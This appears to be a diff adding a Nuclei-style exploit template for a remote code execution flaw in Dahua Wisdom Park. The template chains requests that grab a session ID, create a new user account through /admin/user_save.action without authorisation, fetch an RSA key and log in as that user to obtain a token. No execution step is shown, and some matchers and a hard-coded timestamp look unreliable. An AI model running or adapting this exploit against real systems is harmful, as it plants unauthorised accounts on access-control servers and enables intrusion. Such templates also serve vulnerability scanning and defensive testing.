@@ -1,0 +1,142 @@
+id: dahua_wisdom_park_rce
+
+info:
+  name: Dahua Wisdom Park RCE
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Exploits a remote code execution vulnerability in Dahua Wisdom Park.
+  reference:
+    - https://stack.chaitin.com/techblog/detail?id=103
+
+variables:
+  rboundary: "{{rand_text_alphanumeric(8)}}"
+  username: "{{rand_text_alphanumeric(8)}}"
+  password: "{{rand_text_alphanumeric(8)}}"
+
+http:
+  - id: get_session_id
+    method: GET
+    path:
+      - "/admin/sso_initSession.action"
+    matchers-condition: and
+    matchers:
+      - type: regex
+        regex:
+          - "[0-9a-zA-Z]{32}"
+        part: body
+      - type: word
+        part: header
+        words:
+          - "32"
+    extractors:
+      - type: regex
+        group: 0
+        part: body
+        regex:
+          - "(?P<sid>[0-9a-zA-Z]{32})"
+        name: sid
+        internal: true
+
+  - id: create_user
+    method: POST
+    path:
+      - "/admin/user_save.action"
+    headers:
+      Cookie: JSESSIONID={{sid}}
+      Content-Type: multipart/form-data; boundary=----{{rboundary}}
+    body: |
+      ------{{rboundary}}\r\n
+      Content-Disposition: form-data; name="userBean.userType"\r\n
+      \r\n
+      0\r\n
+      ------{{rboundary}}\r\n
+      Content-Disposition: form-data; name="userBean.ownerCode"\r\n
+      \r\n
+      001\r\n
+      ------{{rboundary}}\r\n
+      Content-Disposition: form-data; name="userBean.isReuse"\r\n
+      \r\n
+      0\r\n
+      ------{{rboundary}}\r\n
+      Content-Disposition: form-data; name="userBean.macStat"\r\n
+      \r\n
+      0\r\n
+      ------{{rboundary}}\r\n
+      Content-Disposition: form-data; name="userBean.roleIds"\r\n
+      \r\n
+      1\r\n
+      ------{{rboundary}}\r\n
+      Content-Disposition: form-data; name="userBean.loginName"\r\n
+      \r\n
+      {{username}}\r\n
+      ------{{rboundary}}\r\n
+      Content-Disposition: form-data; name="displayedOrgName"\r\n
+      \r\n
+      {{username}}\r\n
+      ------{{rboundary}}\r\n
+      Content-Disposition: form-data; name="userBean.loginPass"\r\n
+      \r\n
+      {{password}}\r\n
+      ------{{rboundary}}\r\n
+      Content-Disposition: form-data; name="checkPass"\r\n
+      \r\n
+      {{password}}\r\n
+      ------{{rboundary}}\r\n
+      Content-Disposition: form-data; name="userBean.groupId"\r\n
+      \r\n
+      0\r\n
+      ------{{rboundary}}\r\n
+      Content-Disposition: form-data; name="userBean.userName"\r\n
+      \r\n
+      {{username}}\r\n
+      ------{{rboundary}}--
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "validationError:::用户名称已存在:::validationError"
+        part: body
+      - type: word
+        words:
+          - "0"
+        part: header
+
+  - id: get_public_key
+    method: POST
+    path:
+      - "/WPMS/getPublicKey"
+    headers:
+      Content-Type: application/json
+    body: |
+      {"loginName":"{{username}}"}
+    matchers:
+      - type: word
+        words:
+          - '"publicKey":'
+        part: body
+    extractors:
+      - type: regex
+        regex:
+          - '"publicKey":"(?P<pubkey>.*?)"'
+        name: pubkey
+        internal: true
+
+  - id: login_user
+    method: POST
+    path:
+      - "/WPMS/login"
+    headers:
+      Content-Type: application/json
+    body: |
+      {"loginName":"{{username}}","loginPass":"{{base64(rsaEncryptPKCS1v15(bytes(password),pubkey))}}","timestamp":"16853622671401904168273612873678126378126387"}
+    matchers:
+      - type: word
+        words:
+          - '"success":"true"'
+        part: body
+    extractors:
+      - type: regex
+        regex:
+          - '"token":"(?P<token>.*?)"'
+        name: token
